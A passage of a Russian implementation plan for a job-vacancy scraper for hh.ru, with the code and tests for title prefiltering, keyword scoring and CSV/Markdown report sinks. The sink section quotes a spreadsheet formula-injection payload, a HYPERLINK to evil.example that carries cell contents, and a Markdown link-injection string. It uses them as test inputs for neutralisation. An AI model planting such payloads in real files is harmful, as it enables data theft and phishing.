    """Три совпадения — три слова в причине. Первое из них ничем не лучше
    остальных, а «одно слово из трёх» превращает отладку в угадывание."""
    reason = Prefilter(make_profile(SPEC_NEGATIVE)).reason_to_reject(
        make_vacancy("Программист 1С (стажер/junior)")
    )
    assert reason == "стоп-слово в заголовке: junior, стажёр, 1c"


def test_empty_negative_list_rejects_nothing() -> None:
    """Профиль без стоп-слов — законная конфигурация: конвейер тогда просто
    не отсеивает ничего локально, а не отсеивает всё."""
    prefilter = Prefilter(make_profile([]))
    assert prefilter.reason_to_reject(make_vacancy("Курьер на личном автомобиле")) is None


def test_only_the_title_is_examined() -> None:
    """На шаге 3 известен только заголовок (спека §3.2): компания и регион
    приходят со страницы вакансии, то есть уже после оплаты запросом.
    Стоп-слово в поле, которого у листинга нет, отказом быть не может."""
    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
    vacancy = make_vacancy("Инженер-программист", company="Продажи и курьеры")
    assert prefilter.reason_to_reject(vacancy) is None


def test_empty_stop_word_cannot_reach_the_prefilter() -> None:
    """Страховка на самое дорогое: пустой сигнал компилируется в регулярку
    из одних границ слова и отбраковывает почти любой заголовок — молча и
    необратимо. Отвергается дважды, и оба раза проверяются здесь."""
    with pytest.raises(ValidationError):
        make_profile([""])
    with pytest.raises(ValueError, match="пустой сигнал"):
        SignalMatcher([" "])


def test_no_good_title_is_lost_on_the_live_listing() -> None:
    """Живая страница `/vacancies/programmist`, 20 настоящих заголовков.

    Проверяется список выживших ЦЕЛИКОМ, а не только число отказов: ложный
    отказ выбрасывает хорошую вакансию навсегда, и это самая дорогая
    ошибка конвейера. Список зафиксирован по факту прогона; любое
    расширение стоп-слов, задевающее эти девять заголовков, обязано
    покраснеть здесь.
    """
    prefilter = Prefilter(make_profile(SPEC_NEGATIVE))
    vacancies = parse_listing(load(LIVE_LISTING), "programmist")
    assert len(vacancies) == 20

    survived = [v.title for v in vacancies if prefilter.reason_to_reject(v) is None]
    assert survived == [
        "Программист: WinForms (MVP), C#, .NET",
        "Программист-разработчик С#",
        "Java разработчик (ученик)",
        "Программист .Net",
        "Разработчик систем извлечения данных",
        "Инженер-программист",
        "Преподаватель для младшей школы (программирование и ИТ)",
        "Программист на ПО Fansy (SPECTRE, DEPO)",
        "Программист SQL/Delphi",
    ]
```

Про живую фикстуру, чтобы число не выглядело магическим: из 20 заголовков префильтр
отбраковывает 11 (стажёр/junior/1С в разных написаниях) и пропускает 9 — **ноль ложных
отказов**. Среди пропущенных есть заведомо нерелевантные («Преподаватель для младшей
школы») — это правильная сторона размена: их отсеет скоринг, и они стоят одного запроса,
а не потерянной вакансии.

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_prefilter.py -v`
Expected: `ModuleNotFoundError: No module named 'hh_search.filtering.prefilter'`, «1 error»
(падение на сборке модуля — файла ещё нет)

- [ ] **Step 3: Реализовать `hh_search/filtering/prefilter.py`**

```python
"""Шаг 3 конвейера: единственный барьер перед дорогим шагом 4.

На этом шаге известен ТОЛЬКО заголовок. Discovery идёт по листингу
`/vacancies/{slug}`, который отдаёт id, url и название — компания, регион,
зарплата и дата публикации приходят со страницы вакансии, то есть уже
после того, как за неё заплачено запросом (спека §3.2, §4.1). Поэтому
отсева по региону здесь нет и быть не может.

Цена ошибки асимметрична: ложный отказ — это `status='rejected'`
навсегда, хорошая вакансия не вернётся ни следующим прогоном, ни после
правки конфига. Пропущенный мусор стоит одного запроса к hh.ru. Отсюда
и правило: отсеиваем только по явным стоп-словам, ничего не угадываем.
"""

from hh_search.config.models import ProfileConfig
from hh_search.domain.models import DiscoveredVacancy
from hh_search.filtering.matching import SignalMatcher


class Prefilter:
    """Дешёвый отсев по заголовку — стоит до скачивания страницы вакансии."""

    def __init__(self, profile: ProfileConfig) -> None:
        # Пустой сигнал сюда не доедет: его отвергают и валидатор конфига
        # (`Signal` в config/models.py), и сам `_compile`. Проверять третий
        # раз здесь нечего — но тест на это в suite'е есть, потому что
        # именно в отсеве последствия такого сигнала необратимы.
        self._negative = SignalMatcher(profile.negative)

    def reason_to_reject(self, vacancy: DiscoveredVacancy) -> str | None:
        """Причина отказа или `None`, если вакансия идёт дальше.

        В причину попадают ВСЕ совпавшие стоп-слова, а не первое: причина
        уходит в `reject_reason` и остаётся единственным следом решения,
        а «одно слово из трёх» превращает отладку списка сигналов в
        угадывание.
        """
        matched = self._negative.find(vacancy.title)
        if matched:
            return f"стоп-слово в заголовке: {', '.join(matched)}"
        return None
```

- [ ] **Step 4: Запустить все проверки**

Run: `uv run pytest tests/test_prefilter.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/filtering/prefilter.py tests/test_prefilter.py`
Expected: `7 passed`, затем `245 passed` (238 до задачи + 7), `Success: no issues found`,
`All checks passed!`, `2 files already formatted`

`ruff format --check` запускается **по новым файлам, а не по репозиторию**: форматтер
вводится в CI задачей 13, и на текущем HEAD ему не соответствуют 13 существующих файлов.
Новый код обязан соответствовать сразу, чтобы задача 13 не превратилась в переформатирование
всего проекта.

- [ ] **Step 5: Коммит**

```bash
git add hh_search/filtering/prefilter.py tests/test_prefilter.py
git commit -m "feat: префильтр по стоп-словам в заголовке

Отсекает мусор до скачивания страницы вакансии — именно этот шаг
удерживает нагрузку на hh.ru на уровне единиц запросов за прогон.
Отсев только по заголовку: после переезда discovery на листинг
регион и компания на этом шаге неизвестны в принципе.
Главный тест — на живой фикстуре листинга: 20 настоящих заголовков,
11 отказов, ноль ложных. Ложный отказ необратим."
```

---

### Task 8: Скоринг

**Files:**
- Create: `hh_search/scoring/__init__.py`, `hh_search/scoring/base.py`, `hh_search/scoring/keyword.py`
- Test: `tests/test_scoring.py`

**Interfaces:**
- Consumes: `ProfileConfig` из Task 1, `SignalMatcher` из Task 2, `DiscoveredVacancy`/`VacancyDetails`/`ScoreBreakdown` из Task 3
- Produces: протокол `Scorer` с методом `score(discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown`; `class KeywordScorer(profile: ProfileConfig)`, реализующий его

Формула (спека §6): `total = max(100 × (0.40·title + 0.30·stack + 0.20·responsibilities + 0.10·domain) − penalty, 0)`.
Компонент `title` — 1.0, если в заголовке есть и роль, и технология; 0.5, если что-то одно; иначе 0.
`stack` и `responsibilities` — `min(len(найдено) / saturation, 1.0)` по описанию.
`domain` — 1.0, если сигнал домена встретился в описании или названии компании.
`penalty` — количество негативных сигналов в заголовке и описании, умноженное на `penalty_per_signal`.

**Три решения, которые обязаны попасть в код именно так, потому что иначе тесты стерегут
не то, ради чего задача существует.**

1. **Компания читается из `details`, а не только из `discovered`.** Листинг компанию не
   отдаёт, а в базу она попадает тем же `save_enriched`, который сохраняет оценку, — то
   есть **после** вызова скорера. Читая только `discovered.company`, домен терялся бы у
   каждой вакансии на первом прогоне и находился лишь при локальном пересчёте.
2. **Верхнего `clamp` нет.** Компоненты ≤ 1.0, веса неотрицательны и суммируются в 1.0
   (валидатор `Weights`), штраф неотрицателен (`penalty_per_signal ≥ 0`) — значит
   `total ≤ 100` по построению. `min(..., 100.0)` был бы кодом, который не исполняется ни
   на одном валидном входе, то есть и проверить его нечем. Нижний `max(..., 0.0)`
   достижим любым мусорным заголовком и тестом закрыт.
3. **Округляется только `total`.** Компоненты остаются как есть (`0.3333…`, а не `0.33`):
   `score_detail` читает человек, настраивающий веса, и арифметика §6 по разбивке должна
   сходиться обратно к `total`. Округлённые компоненты её ломают: `0.20·0.33` даёт 58.6
   там, где формула даёт 58.7. Пример JSON в §6 спеки округлён для читаемости — это
   иллюстрация, а не формат.

**Известное ограничение, не закрываемое кодом:** дубликат в списке сигналов накручивает
насыщение. `stack: [yocto, yocto, yocto, yocto, yocto]` при `saturation.stack = 5` даёт
1.0 на описании с одним словом, потому что `find` возвращает по одному вхождению на
паттерн, а не на уникальное слово. Дубликат в YAML — законный ключ с законным значением,
ловить его нечем; проверяется глазами при правке профиля.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_scoring.py`:

```python
import gzip
from pathlib import Path

from hh_search.config.models import ProfileConfig, Saturation, Signals, Weights
from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sources.vacancy_page import parse_vacancy_page

FIXTURES = Path(__file__).parent / "fixtures"
LIVE_VACANCY = "vacancy.html.gz"


def make_profile() -> ProfileConfig:
    """Стенд для арифметики §6: в stack шесть сигналов при насыщении 5, в
    responsibilities четыре при насыщении 3 — иначе «насыщение» проверить
    нечем, `min(n/n, 1.0)` и `n/n` неразличимы."""
    return ProfileConfig(
        weights=Weights(title=0.4, stack=0.3, responsibilities=0.2, domain=0.1),
        saturation=Saturation(stack=5, responsibilities=3),
        penalty_per_signal=15,
        signals=Signals(
            title_roles=["team lead", "senior"],
            title_tech=["backend", "embedded"],
            stack=["yocto", "buildroot", "c++", "kubernetes", "kafka", "docker"],
            responsibilities=["архитектур", "менторинг", "код-ревью", "проектирован"],
            domain=["телеком"],
        ),
        negative=["junior", "1c", "продаж"],
    )


def score_for(
    title: str,
    description: str,
    company: str | None = None,
    page_company: str | None = None,
) -> ScoreBreakdown:
    discovered = DiscoveredVacancy(
        id="1",
        url="https://hh.ru/vacancy/1",
        title=title,
        company=company,
        found_by_query="programmist",
    )
    details = VacancyDetails(description=description, company=page_company)
    return KeywordScorer(make_profile()).score(discovered, details)


def load(name: str) -> str:
    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
        return handle.read()


# --- отдельные компоненты -------------------------------------------------


def test_empty_vacancy_scores_zero() -> None:
    assert score_for("Курьер", "Доставка заказов").total == 0.0


def test_title_needs_both_role_and_tech_for_full_component() -> None:
    assert score_for("Senior Embedded Engineer", "").title == 1.0


def test_title_with_only_role_gives_half() -> None:
    assert score_for("Senior Engineer", "").title == 0.5


def test_stack_is_proportional_below_saturation() -> None:
    assert score_for("Инженер", "Опыт Yocto и Buildroot").stack == 0.4


def test_stack_saturates_above_configured_count() -> None:
    """Шесть сигналов при насыщении 5. Ровно пять ничего не доказали бы:
    `min(5/5, 1.0)` равно `5/5` при любом устройстве формулы."""
    result = score_for(
        "Senior Embedded Engineer",
        "Yocto, Buildroot, C++, Kubernetes, Kafka, Docker — всё это в проекте",
    )
    assert result.stack == 1.0
    # Без насыщения было бы 6/5 = 1.2 и total 76.0.
    assert result.total == 70.0


def test_responsibilities_saturate_above_their_own_count() -> None:
    """У responsibilities своё насыщение (3), и оно тоже проверяется
    превышением: четыре сигнала при трёх."""
    result = score_for(
        "Инженер",
        "Архитектура, менторинг, код-ревью и проектирование подсистем",
    )
    assert result.responsibilities == 1.0
    # Без насыщения было бы 4/3 = 1.33 и total 26.7.
    assert result.total == 20.0


def test_domain_matches_company_name() -> None:
    assert score_for("Инженер", "", company="Телеком Решения").domain == 1.0


def test_domain_sees_the_company_from_the_freshly_parsed_page() -> None:
    """На первом скоринге компания известна только из `details`.

    Листинг её не отдаёт, а в базу она попадает тем же `save_enriched`,
    который сохраняет оценку, — то есть ПОСЛЕ вызова скорера. Читать
    только `discovered.company` значило бы терять домен у каждой вакансии
    на первом прогоне и находить его лишь при локальном пересчёте.
    """
    assert score_for("Инженер", "", page_company="Телеком Решения").domain == 1.0


# --- формула целиком ------------------------------------------------------


def test_weights_follow_the_spec_formula() -> None:
    """0.40·1.0 + 0.30·(2/5) + 0.20·(1/3) + 0.10·0 = 0.5867 → 58.7.

    Все четыре компонента здесь РАЗНЫЕ, поэтому перестановка любых двух
    весов меняет результат. Тест «идеальная вакансия даёт 100» этого не
    ловит: при всех компонентах 1.0 сумма весов равна 1.0 в любом порядке.
    """
    result = score_for("Senior Embedded Engineer", "Опыт Yocto и Buildroot, участие в архитектуре.")
    assert result.title == 1.0
    assert result.stack == 0.4
    assert result.total == 58.7


def test_perfect_match_reaches_hundred() -> None:
    description = (
        "Yocto Buildroot C++ Kubernetes Kafka. "
        "Архитектура, менторинг, код-ревью, проектирование. Телеком"
    )
    assert score_for("Senior Embedded Engineer", description).total == 100.0


def test_penalty_scales_with_number_of_signals() -> None:
    """Два стоп-слова — два штрафа. Одно неразличимо: `len(negative) * 15`
    и `15 if negative else 0` дают на нём одно и то же число."""
    result = score_for("Senior Embedded Engineer", "Знание 1С и опыт продаж")
    assert result.matched["negative"] == ["1c", "продаж"]
    assert result.penalty == 30.0
    assert result.total == 10.0


def test_total_never_goes_below_zero() -> None:
    assert score_for("Junior 1C", "Junior 1C, продажи").total == 0.0


def test_matched_lists_follow_config_order() -> None:
    """Порядок в разбивке — порядок КОНФИГА, а не порядок вхождения в текст.
    В описании сначала Kafka, в конфиге сначала yocto."""
    result = score_for("Senior Embedded Engineer", "Опыт Kafka и Yocto")
    assert result.matched["stack"] == ["yocto", "kafka"]
    assert result.matched["title_roles"] == ["senior"]


# --- живая страница -------------------------------------------------------


def spec_profile() -> ProfileConfig:
    """Образец profile.yaml из спеки §7 — тот, что поедет в прод.

    Списки заданы через `|`, потому что среди сигналов есть многословные
    («team lead», «ручн тестиров»), а вертикальная простыня из шестидесяти
    строк не читается.
    """
    return ProfileConfig(
        weights=Weights(title=0.40, stack=0.30, responsibilities=0.20, domain=0.10),
        saturation=Saturation(stack=5, responsibilities=3),
        penalty_per_signal=15,
        signals=Signals(
            title_roles="team lead|tech lead|teamlead|senior|ведущ|старш|руководител".split("|"),
            title_tech="backend|embedded|linux|c++|python|node|node.js|nodejs|firmware".split("|"),
            stack=(
                "yocto|buildroot|openwrt|bsp|kernel|arm|arm64|armv7|armv8|c++|python|node.js|"
                "typescript|docker|kubernetes|kafka|postgresql|clickhouse|llm|rag|mcp"
            ).split("|"),
            responsibilities=(
                "архитектур|менторинг|код-ревью|code review|проектирован|техдолг"
            ).split("|"),
            domain="телеком|встраиваем|embedded|iot|микросервис".split("|"),
        ),
        negative=(
            "junior|стажёр|intern|1c|продаж|рекрутер|ручн тестиров|оператор пк|"
            "оператор call|оператор колл|оператор станка|курьер"
        ).split("|"),
        report_threshold=60,
    )


def test_live_vacancy_page_scores_as_measured() -> None:
    """Живая страница вакансии, идеально целевая по названию, и профиль из §7.

    Числа зафиксированы по факту прогона, а не по желаемому, и факт
    неприятный: 80.0 набраны при НУЛЕВОМ вкладе обязанностей — ни один из
    шести сигналов `responsibilities` в описании не встретился, хотя это
    ровно та вакансия, ради которой сервис написан. Двадцать очков из ста
    здесь не заработали, и увидеть это надо при реализации, а не в проде
    по пустому разделу «Топ».

    Заодно это второй, независимый от синтетики свидетель насыщения:
    совпало семь сигналов стека при насыщении 5.
    """
    details = parse_vacancy_page(load(LIVE_VACANCY))
    discovered = DiscoveredVacancy(
        id="135586311",
        url="https://hh.ru/vacancy/135586311",
        title="Старший инженер-разработчик Embedded Linux (BSP, ARM64, i.MX 8M Plus)",
        found_by_query="programmist",
    )
    result = KeywordScorer(spec_profile()).score(discovered, details)
    assert result.matched["stack"] == ["yocto", "buildroot", "bsp", "kernel", "arm", "arm64", "c++"]
    assert result.matched["responsibilities"] == []
    assert (result.title, result.stack, result.responsibilities, result.domain) == (
        1.0,
        1.0,
        0.0,
        1.0,
    )
    assert result.penalty == 0.0
    assert result.total == 80.0
```

Тест на живой фикстуре — не украшение: он единственный, кто здесь смотрит на настоящий
текст описания. Его вывод (80.0 при нулевых обязанностях) — вход для настройки профиля в
задаче 12, а не повод подкрутить ожидание.

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_scoring.py -v`
Expected: `ModuleNotFoundError: No module named 'hh_search.scoring'`, «1 error»

- [ ] **Step 3: Реализовать `hh_search/scoring/base.py`**

```python
from typing import Protocol

from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails


class Scorer(Protocol):
    """Точка расширения: сюда позже встанет оценщик на LLM (Claude, OpenAI, локальная модель)."""

    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown: ...
```

- [ ] **Step 4: Реализовать `hh_search/scoring/keyword.py`**

```python
from hh_search.config.models import ProfileConfig
from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, VacancyDetails
from hh_search.filtering.matching import SignalMatcher


class KeywordScorer:
    """Оценка по спискам ключевых слов из profile.yaml (спека §6).

    total = 100 × (w.title·title + w.stack·stack + w.resp·resp + w.domain·domain) − penalty,
    снизу подрезано нулём.

    Известное ограничение: дубликат в списке сигналов накручивает
    насыщение. `stack: [yocto, yocto, yocto, yocto, yocto]` при
    `saturation.stack = 5` даёт 1.0 на описании с одним словом — `find`
    возвращает по одному вхождению на ПАТТЕРН, а не на уникальное слово.
    Ловить это в коде нечем: дубликат в YAML — законный ключ с законным
    значением. Проверяется глазами при правке профиля.
    """

    def __init__(self, profile: ProfileConfig) -> None:
        self._profile = profile
        signals = profile.signals
        self._title_roles = SignalMatcher(signals.title_roles)
        self._title_tech = SignalMatcher(signals.title_tech)
        self._stack = SignalMatcher(signals.stack)
        self._responsibilities = SignalMatcher(signals.responsibilities)
        self._domain = SignalMatcher(signals.domain)
        self._negative = SignalMatcher(profile.negative)

    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown:
        title = discovered.title
        description = details.description
        company = discovered.company or details.company or ""

        roles = self._title_roles.find(title)
        tech = self._title_tech.find(title)
        stack = self._stack.find(description)
        responsibilities = self._responsibilities.find(description)
        domain = self._domain.find(f"{description}\n{company}")
        negative = self._negative.find(f"{title}\n{description}")

        title_component = 1.0 if roles and tech else (0.5 if roles or tech else 0.0)
        # Насыщение обязательно: без min(...) оценка измеряла бы длину
        # описания, а не релевантность (спека §6). Делитель ≥ 1 гарантирован
        # валидатором конфига — иначе здесь было бы деление на ноль уже
        # ПОСЛЕ похода в сеть.
        stack_component = min(len(stack) / self._profile.saturation.stack, 1.0)
        responsibilities_component = min(
            len(responsibilities) / self._profile.saturation.responsibilities, 1.0
        )
        domain_component = 1.0 if domain else 0.0

        weights = self._profile.weights
        weighted = (
            weights.title * title_component
            + weights.stack * stack_component
            + weights.responsibilities * responsibilities_component
            + weights.domain * domain_component
        )
        # Штраф пропорционален ЧИСЛУ стоп-слов: одно случайное слово не
        # убивает хорошую вакансию, три убивают (спека §6).
        penalty = len(negative) * self._profile.penalty_per_signal
        # Верхнего clamp'а нет сознательно: компоненты ≤ 1.0, веса
        # неотрицательны и суммируются в 1.0 (валидатор `Weights`), штраф
        # неотрицателен — значит total ≤ 100 по построению, и min(..., 100)
        # был бы кодом, который не может исполниться ни на одном входе, то
        # есть и проверить его было бы нечем. Нижний нужен: штраф
        # утаскивает сумму в минус на любом мусорном заголовке.
        total = max(100.0 * weighted - penalty, 0.0)

        return ScoreBreakdown(
            title=title_component,
            stack=stack_component,
            responsibilities=responsibilities_component,
            domain=domain_component,
            penalty=penalty,
            # Округляется только total — число, которое человек сравнивает с
            # порогом. Компоненты остаются как есть: по ним арифметика §6
            # должна сходиться обратно, а 0.67 вместо 1/3 её ломает.
            total=round(total, 1),
            matched={
                "title_roles": roles,
                "title_tech": tech,
                "stack": stack,
                "responsibilities": responsibilities,
                "domain": domain,
                "negative": negative,
            },
        )
```

Создать пустой `hh_search/scoring/__init__.py`.

- [ ] **Step 5: Запустить все проверки**

Run: `uv run pytest tests/test_scoring.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/scoring tests/test_scoring.py`
Expected: `14 passed`, затем `259 passed`, `Success: no issues found`, `All checks passed!`,
`4 files already formatted`

- [ ] **Step 6: Коммит**

```bash
git add hh_search/scoring tests/test_scoring.py
git commit -m "feat: keyword-скоринг с насыщением и штрафами

Насыщение обязательно: без него оценка измеряла бы длину описания,
а не релевантность. Штраф вычитается пропорционально числу стоп-слов,
поэтому одно случайное слово не убивает хорошую вакансию, а три
убивают. Разбивка со списком совпавших слов сохраняется — без неё
веса невозможно настроить.

Тесты стерегут саму формулу: разные значения всех четырёх компонентов
(перестановка весов краснеет), превышение насыщения, а не равенство
ему, два стоп-слова вместо одного. Живая страница вакансии показывает
факт: 80.0 при нулевом вкладе обязанностей."
```

---

### Task 9: Приёмники отчётов

**Files:**
- Create: `hh_search/sinks/__init__.py`, `hh_search/sinks/base.py`, `hh_search/sinks/csv_sink.py`, `hh_search/sinks/markdown_sink.py`
- Test: `tests/test_sinks.py`

**Interfaces:**
- Consumes: `ScoredVacancy` из Task 3
- Produces: протокол `Sink` (атрибут `name: str`, метод `emit(vacancies: Sequence[ScoredVacancy], now: datetime) -> None`), константа `REPORT_DATE_FORMAT`; `class CsvSink(reports_dir: Path)`; `class MarkdownSink(reports_dir: Path, threshold: float)`; фабрика `build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> list[Sink]` (неизвестное имя → `ValueError`)

Имена файлов: `{reports_dir}/{YYYY-MM-DD}-new.csv` и `{reports_dir}/{YYYY-MM-DD}-new.md`.
Повторный прогон в тот же день **дописывает** данные в существующие файлы; заголовок CSV и
BOM пишутся только при создании.

**Почему у этой задачи тесты подробнее кода.** После `mark_reported()` вакансия навсегда
уходит из `unreported()` — переотправки нет по построению (спека §5.2). Всё, что приёмник
потерял или затёр, потеряно **окончательно**: колонка, которую он не записал, раздел,
который затёр второй прогон дня, вакансия, съеденная строгим неравенством на пороге. Из-за
этого тесты проверяют состав строки CSV **целиком** (сравнением всего словаря
`csv.DictReader`), а не три поля из двенадцати.

**Четыре решения по формату, каждое — следствие факта, а не вкуса.**

1. **CSV: `utf-8-sig` и `delimiter=";"`.** Без BOM Excel читает UTF-8 как cp1251 и
   показывает `ÐžÐžÐž`; с русской локалью разделителем списка является `;`, и файл с
   запятыми целиком ложится в первую колонку. BOM при этом пишется **ровно один раз за
   файл**: кодек `utf-8-sig` добавляет его при каждом открытии, поэтому второй прогон дня
   должен открывать файл как `utf-8`.
2. **CSV: обезвреживание формул.** Заголовок и название компании пишет работодатель, то
   есть это внешний недоверенный текст. Значение вида
   `=HYPERLINK("http://evil.example/?u="&A1;"вакансия")` Excel исполнит, а вполне обычный
   заголовок `+7 (999) 123-45-67 — Embedded Linux` покажет как `#ИМЯ?`. Квотирование
   модуля `csv` от этого не защищает — оно про разделители, а не про интерпретацию.
   Лечение — префикс `'` для значений, начинающихся с `= + - @ \t \r`.
3. **Markdown: экранирование.** `[Удалённо]` в начале названия на hh.ru встречается, а
   `**[Ссылка ](https://evil.example) конец](https://hh.ru/vacancy/4)**` рендерится как
   рабочая ссылка на чужой сайт. Экранируются `[ ] \` ` * _`, а переводы строк
   схлопываются: пустая строка внутри пункта — это конец пункта для любого рендерера.
4. **Формат даты задан явно.** Из хранилища даты приходят как aware UTC
   (`storage/time_utils.py`), то есть `isoformat()` дал бы
   `2026-07-27T11:48:48.366000+00:00` — с микросекундами, не читаемое человеком и не
   распознаваемое Excel как дата. В отчёте `%Y-%m-%d %H:%M`, время — UTC, как в базе.
   `published_at` при этом **необязателен** (листинг даты не отдаёт): неизвестная дата —
   пустая ячейка, а не строка `None` и не падение.

**Колонка `found_by_query` переименована в `listing`.** После переезда discovery в этом
поле лежит slug листинга (`programmist`), а не текст поискового запроса; прежнее имя
вводило бы в заблуждение читателя отчёта. Имя поля модели не меняется — оно фигурирует в
хранилище и в задаче 10.

**Неизвестное имя sink обязано ронять процесс на старте.** `build_sinks` для этого
вызывается **до `start_run()`** и до первого сетевого запроса (требование спеки §7/§9) —
это контракт для задачи 10. Проверять имена типом (`Literal["csv", "markdown"]` в
`app.yaml`) не стали: список приёмников раздвоился бы между схемой конфига и фабрикой, а
расширение через `Sink` — заявленная точка роста (спека §4.2).

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_sinks.py`:

```python
import csv
import re
from datetime import UTC, datetime
from pathlib import Path

import pytest

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
)
from hh_search.sinks import build_sinks
from hh_search.sinks.csv_sink import COLUMNS, CsvSink
from hh_search.sinks.markdown_sink import SNIPPET_LENGTH, MarkdownSink

# Данные тестов повторяют то, что приходит из хранилища: даты — aware UTC с
# микросекундами (`storage/time_utils.py`), а зарплата и дата публикации
# могут отсутствовать честно (листинг их не отдаёт, а на странице вакансии
# блока зарплаты может не быть вовсе).
NOW = datetime(2026, 7, 27, 10, 0, tzinfo=UTC)
PUBLISHED = datetime(2026, 7, 27, 6, 21, 20, 933000, tzinfo=UTC)
SALARY = Salary(raw="от 200 000 ₽", amount_from=200000, currency="₽")


def make_scored(
    vacancy_id: str = "1",
    title: str = "Embedded Engineer",
    total: float = 87.4,
    cluster: str = "embedded",
    company: str | None = "ООО Ромашка",
    area: str | None = "Нижний Новгород",
    salary: Salary = SALARY,
    published_at: datetime | None = PUBLISHED,
    description: str = "Требуется опыт Yocto и BSP.",
) -> ScoredVacancy:
    return ScoredVacancy(
        discovered=DiscoveredVacancy(
            id=vacancy_id,
            url=f"https://hh.ru/vacancy/{vacancy_id}",
            title=title,
            company=company,
            area=area,
            salary=salary,
            published_at=published_at,
            found_by_query="programmist",
        ),
        details=VacancyDetails(description=description),
        score=ScoreBreakdown(
            title=1.0,
            stack=0.8,
            responsibilities=0.5,
            domain=1.0,
            penalty=0.0,
            total=total,
            matched={"stack": ["yocto"]},
        ),
        cluster=cluster,
    )


def read_rows(path: Path) -> list[dict[str, str]]:
    with path.open(encoding="utf-8-sig", newline="") as handle:
        return list(csv.DictReader(handle, delimiter=";"))


# --- CSV: второго шанса не будет ------------------------------------------


def test_csv_row_carries_every_column(tmp_path: Path) -> None:
    """Сравнивается словарь ЦЕЛИКОМ, а не три поля из двенадцати.

    После `mark_reported()` вакансия навсегда уходит из `unreported()`:
    колонка, которую приёмник не записал, потеряна окончательно —
    переотправки нет по построению (спека §5.2).
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    rows = read_rows(tmp_path / "2026-07-27-new.csv")
    assert rows == [
        {
            "id": "1",
            "score": "87.4",
            "cluster": "embedded",
            "title": "Embedded Engineer",
            "company": "ООО Ромашка",
            "area": "Нижний Новгород",
            "salary_from": "200000",
            "salary_to": "",
            "currency": "₽",
            "published_at": "2026-07-27 06:21",
            "listing": "programmist",
            "url": "https://hh.ru/vacancy/1",
        }
    ]


def test_csv_opens_in_excel(tmp_path: Path) -> None:
    """BOM и `;` — не вкус, а условие читаемости.

    Без BOM Excel читает UTF-8 как cp1251 и показывает `ÐžÐžÐž`; с русской
    локалью разделителем списка является `;`, и файл с запятыми целиком
    ложится в первую колонку.
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = (tmp_path / "2026-07-27-new.csv").read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")
    header = raw.decode("utf-8-sig").splitlines()[0]
    assert header == ";".join(COLUMNS)


def test_csv_appends_second_run_without_repeating_header_or_bom(tmp_path: Path) -> None:
    """Второй прогон дня дописывает, а не начинает файл заново — и не
    вставляет второй BOM: кодек utf-8-sig пишет его при каждом открытии."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    sink.emit([make_scored(vacancy_id="2")], NOW)
    path = tmp_path / "2026-07-27-new.csv"
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]
    assert path.read_text(encoding="utf-8-sig").count("\ufeff") == 0


def test_csv_neutralizes_formula_written_by_the_employer(tmp_path: Path) -> None:
    """Заголовок вакансии — внешний недоверенный текст: его пишет
    работодатель. Квотирование модуля csv от формул не защищает."""
    title = '=HYPERLINK("http://evil.example/?u="&A1;"вакансия")'
    CsvSink(tmp_path).emit(
        [make_scored(title=title, company="+7 (999) 123-45-67 — Embedded Linux")], NOW
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["title"] == f"'{title}"
    assert row["company"] == "'+7 (999) 123-45-67 — Embedded Linux"


def test_csv_leaves_unknown_date_and_salary_empty(tmp_path: Path) -> None:
    """`published_at` необязателен, а блока зарплаты на странице может не
    быть вовсе. В отчёте это пустые ячейки, а не строка `None` и не падение."""
    CsvSink(tmp_path).emit([make_scored(published_at=None, salary=Salary())], NOW)
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["published_at"] == ""
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("", "", "")


# --- Markdown: порог меняет подробность, а не состав ----------------------


def test_markdown_splits_top_and_rest_by_threshold(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Хорошая вакансия", total=87.4),
            make_scored(vacancy_id="2", title="Так себе вакансия", total=42.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Хорошая вакансия") < text.index("## Остальное")
    assert text.index("## Остальное") < text.index("Так себе вакансия")


def test_markdown_keeps_a_vacancy_exactly_at_the_threshold_in_top(tmp_path: Path) -> None:
    """Спека §6.3 фиксирует `>=`: вакансия на пороге РОВНО идёт в «Топ».

    Разница между `>` и `>=` — это ровно те вакансии, для которых порог и
    подбирался, поэтому строгий знак был бы тихой потерей подробностей.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(title="Ровно порог", total=60.0)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Ровно порог") < text.index("## Остальное")
    assert "_ничего выше порога_" not in text


def test_markdown_orders_top_by_score_descending(tmp_path: Path) -> None:
    """Внутри кластера — от лучшего к худшему: отчёт читают сверху."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Похуже", total=70.0),
            make_scored(vacancy_id="2", title="Получше", total=90.0),
        ],
        NOW,
    )
